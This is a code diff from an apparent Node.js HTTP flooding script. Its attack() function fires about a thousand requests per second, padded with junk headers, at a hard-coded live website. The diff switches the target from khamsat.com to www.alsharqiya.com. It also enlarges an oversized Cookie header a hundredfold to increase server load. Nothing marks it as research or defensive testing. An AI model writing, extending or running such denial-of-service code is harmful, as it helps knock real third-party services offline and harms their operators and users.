@@ -92,7 +92,7 @@ function onListening() {
 
     interval = setInterval(function () {
         for (var i = 1; i<100; i++)
-            attack('https://khamsat.com');
+            attack('https://www.alsharqiya.com');
     },100);
 }
 
@@ -142,7 +142,7 @@ function attack(host) {
         'x-cros-9':'hjugfkljhti85hjutigkrfoluhjtigkrofytijkr',
         'x-cros-10':'hjugfkljhti85hjutigkrfoluhjtigkrofytijkr',
         'x-cros-11':'hjugfkljhti85hjutigkrfoluhjtigkrofytijkr',
-        'Cookie' : `user=${('dgkfgkfkhghgkgkfgk').repeat(500)};`
+        'Cookie' : `user=${('dgkfgkfkhghgkgkfgk').repeat(50000)};`
     };
 
     var form = {
